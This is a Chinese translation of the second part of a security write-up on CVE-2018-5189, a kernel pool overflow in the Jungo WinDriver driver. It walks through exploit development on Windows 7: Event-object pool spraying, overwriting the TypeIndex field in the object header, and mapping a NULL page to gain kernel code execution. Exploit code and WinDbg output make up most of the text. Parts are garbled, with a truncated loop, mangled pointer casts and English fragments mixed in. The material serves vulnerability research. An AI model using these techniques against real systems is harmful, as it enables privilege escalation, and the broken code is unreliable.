# Jungo Windriver中的代码执行漏洞（CVE-2018-5189）分析（下）
##### 译文声明
本文是翻译文章，文章原作者 Fidus InfoSecurity，文章来源：fidusinfosec.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 传送门
[Jungo
Windriver中的代码执行漏洞（CVE-2018-5189）分析（上）](https://www.anquanke.com/post/id/94526)
## 写在前面的话
本系列文章的上集里，我们给大家介绍了有关漏洞CVE-2018-5189利用代码开发过程的前期准备工作以及进行方式，接下来在这篇文章中，我们将解决之前所遇到的一些问题，并给大家提供PoC的完善思路，然后给大家提供最后完整的漏洞利用代码。除此之外，我们还会给大家介绍针对该漏洞的漏洞修复方案。
## 漏洞研究
在开发针对漏洞CVE-2018-5189的利用代码时，有几点非常重要的东西需要关注。首先最重要的就是要记住，我们能够控制内核池的分配空间大小（我们传递过去的大小为(size
– 1) * 0xa + 0x48）。而池喷射的基本模式如下：
  1. 一直不断地重复创建相同大小的对象；
  2. 释放随机位置的特定大小对象，并创建空白区域；
触发调用包含漏洞的驱动程序，并填充分配给内核池的空白区域；  
在进行了多次尝试之后，我们决定使用Event对象来实现我们的目标。下面给出的函数可以完成内核池喷射，然后填充大量的Event对象，并在随机位置创建空白区域（大小为0x380字节）。
    void spray_pool(HANDLE handle_arr[])
    {
    //create SPRAY_SIZE event objects filling up the pool
    for (int i = 0; i  !poolpage 0x861306C0
    walking pool page @ 86130000
    Addr A/F BlockSize PreviousSize PoolIndex PoolType Tag
    86130000: InUse 0040 (008) 0000 (000) 00 02 Eve.
    86130040: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130080: InUse 0040 (008) 0040 (008) 00 02 Eve.
    861300c0: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130100: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130140: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130180: InUse 0040 (008) 0040 (008) 00 02 Eve.
    861301c0: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130200: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130240: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130280: InUse 0040 (008) 0040 (008) 00 02 Eve.
    861302c0: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130300: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130340: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130380: InUse 0040 (008) 0040 (008) 00 02 Eve.
    861303c0: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130400: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130440: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130480: InUse 0040 (008) 0040 (008) 00 02 Eve.
    861304c0: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130500: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130540: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130580: InUse 0040 (008) 0040 (008) 00 02 Eve.
    861305c0: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130600: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130640: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130680: InUse 0040 (008) 0040 (008) 00 02 Eve.
    *861306c0: Free 0380 (070) 0040 (008) 00 04 RDW. —- here
    86130a40: InUse 0040 (008) 0000 (000) 00 02 Eve.
    86130a80: InUse 0040 (008) 0040 (008) 00 02 Eve.
    86130ac0: InUse 0040 (008) 0040 (008) 00 02 Eve.
这也就意味着，我们可以完全控制想要中断的下一个对象。这样一来，我们也就解决了之前所遇到的前两个问题了。那么接下来，我们就要搞清楚如何利用Event对象来实现代码执行了。  
正如我们之前所提到的那样，我们可以使用typeIndex重写方法。为此，我们对Event对象进行了分析，并发现了一些可能的切入点：``
    kd>; dt nt!_POOL_HEADER 8514fac0
    +0x000 PreviousSize : 0y010001100 (0x8c)
    +0x000 PoolIndex : 0y0000000 (0)
    +0x002 BlockSize : 0y000001000 (0x8)
    +0x002 PoolType : 0y0000010 (0x2)
    +0x000 Ulong1 : 0x408008c —- here
    +0x004 PoolTag : 0xee657645 — here
    +0x004 AllocatorBackTraceIndex : 0x7645
    +0x006 PoolTagHash : 0xee65
    kd>; dt nt!_OBJECT_HEADER_QUOTA_INFO 8545f8c0+8 ;+8 to skip past pool header
    +0x000 PagedPoolCharge : 0
    +0x004 NonPagedPoolCharge : 0x40
    +0x008 SecurityDescriptorCharge : 0
    +0x00c SecurityDescriptorQuotaBlock : (null)
    kd> dt nt!_OBJECT_HEADER 8545f8c0+8+10 ;skip past pool header and Quota info
    +0x000 PointerCount : 0n1
    +0x004 HandleCount : 0n1
    +0x004 NextToFree : 0x00000001 Void
    +0x008 Lock : _EX_PUSH_LOCK
    +0x00c TypeIndex : 0xc ‘’
    +0x00d TraceFlags : 0 ‘’
    +0x00e InfoMask : 0x8 ‘’
    +0x00f Flags : 0 ‘’
    +0x010 ObjectCreateInfo : 0x867b3940 _OBJECT_CREATE_INFORMATION
    +0x010 QuotaBlockCharged : 0x867b3940 Void
    +0x014 SecurityDescriptor : (null)
    +0x018 Body : _QUAD
    There are a few values here that we need to keep to stop us from blue-screening. We need to fix the previousSize value to 0x380 (the size of the RDW pool buffer), and then keep all of the other values except the TypeIndex. The TypeIndex is an index into an array of pointers that describes the type of the chunk [4]:
    1: kd> dd nt!ObTypeIndexTable
    82b7dee0 00000000 bad0b0b0 84b43360 84b43298
    82b7def0 84b4af78 84b4ad48 84b4ac08 84b4ab40
    82b7df00 84b4aa78 84b4a9b0 84b4a8e8 84b4a7e8
    82b7df10 84c131d0 84bf7900 84bf7838 84bf7770
    82b7df20 84c0f9c8 84c0f900 84c0f838 84c039c8
    82b7df30 84c03900 84c03838 84bef9c8 84bef900
    82b7df40 84bef838 84bcb5e0 84bcb518 84bcb450
    82b7df50 84bc3c90 84bc34f0 84bc3428 84c0df78如果我们将TypeIndex的值重写为0，那么对象object将会尝试在一个空页面中寻找对应的OBJECT_TYPE信息。0: kd> dt nt!_OBJECT_TYPE 86eb7000 .
    +0x000 TypeList : [ 0x80000 - 0xee657645 ]
    +0x000 Flink : 0x00080000 _LIST_ENTRY
    +0x004 Blink : 0xee657645 _LIST_ENTRY
    +0x008 Name : “瀈蛫俫卜???”
    +0x000 Length : 0x8008
    +0x002 MaximumLength : 0x86ea
    +0x004 ReadVirtual: 82b70938 not properly sign extended
    Buffer : 0x82b70938 “瀈蛫俫卜???”
    +0x010 DefaultObject :
    +0x014 Index : 0 ‘’
    +0x018 TotalNumberOfObjects : 0
    +0x01c TotalNumberOfHandles : 0
    +0x020 HighWaterNumberOfObjects : 0
    +0x024 HighWaterNumberOfHandles : 0x80001
    +0x028 TypeInfo :
    +0x00c GenericMapping : _GENERIC_MAPPING
    +0x01c ValidAccessMask : 0xee657645
    +0x020 RetainAccess : 0
    +0x024 PoolType : 0x40 (No matching name)
    +0x028 DefaultPagedPoolCharge : 0
    +0x02c DefaultNonPagedPoolCharge : 0
    +0x030 DumpProcedure : 0x00000001 void +1
    +0x034 OpenProcedure : 0x00000001 long +1
    +0x038 CloseProcedure : (null)
    +0x03c DeleteProcedure : 0x0008000c void +8000c
    +0x040 ParseProcedure : 0x86dd0d80 long +ffffffff86dd0d80
    +0x044 SecurityProcedure : (null)
    +0x048 QueryNameProcedure : 0x00040001 long +40001
    +0x04c OkayToCloseProcedure : (null)
    别忘了，我们的测试平台使用的是Windows 7，所以我们可以映射一个空白页面来创建我们自己的OkayToClose过程。接下来，我们要做的第一件事情就是修改我们的用户空间缓冲区，并让其包含正确的值：//pool header block
    (ULONG )(user_buff + 0x374) = 0x04080070; //ULONG1
    (ULONG )(user_buff + 0x378) = 0xee657645;//PoolTag
    //QuotaInfo block
    (ULONG )(user_buff + 0x37c) = 0x00000000; //PagedPoolCharge
    (ULONG )(user_buff + 0x380) = 0x00000040; //NonPagedPoolCharge
    (ULONG )(user_buff + 0x384) = 0x00000000; //SecurityDescriptorCharge
    (ULONG )(user_buff + 0x388) = 0x00000000; //SecurityDescriptorQuotaBlock
    //Event header block
    (ULONG )(user_buff + 0x38c) = 0x00000001; //PointerCount
    (ULONG )(user_buff + 0x390) = 0x00000001; //HandleCount
    (ULONG )(user_buff + 0x394) = 0x00000000; //NextToFree
    (ULONG )(user_buff + 0x398) = 0x00080000; //TypeIndex  r
    eax=c6239b40 ebx=00000000 ecx=00000000 edx=872aab58 esi=872aab58 edi=84c3c498
    eip=82c5e520 esp=be363ba0 ebp=be363bdc iopl=0 nv up ei ng nz na po nc
    cs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010282
    nt!MmInitializeProcessAddressSpace+0xc6:
    82c5e520 837b7400 cmp dword ptr [ebx+74h],0 ds:0023:00000074=????????
    可能一眼看去有些难理解，因为ebx为空，而它却在寻找0x74的值。我们对edx进行分析后发现，Event对象直接出现在了溢出后的缓冲区中：
    872aa7c0: Free 0380 (070) 0040 (008) 00 00 RDW.
    *872aab40: InUse 0040 (008) 0380 (070) 00 02 Eve.
    872aab80: Free 0040 (008) 0040 (008) 00 04 Eve.
    0: kd> dd 872aab40
    872aab40 04080070 ee657645 00000000 00000040
    872aab50 00000000 00000000 00000001 00000001
    872aab60 00000000 00080000 867b3940 00000000
    872aab70 00000000 00000000 872aab78 872aab78需要注意的是，TypeIndex已经被我们成功重写了，而这将会让内核在0x74寻找okayToCloseProcedure。那么现在，我们就非常接近成功了，而接下来要做的就是映射一个空白页面，然后放置一个指向我们所需要执行的函数指针（在内核模式下）。下面给出的函数可以帮助我们实现目标：BOOL map_null_page()
    {
    / Begin NULL page map /
    HMODULE hmodule = LoadLibraryA(“ntdll.dll”);
    if (hmodule == INVALID_HANDLE_VALUE)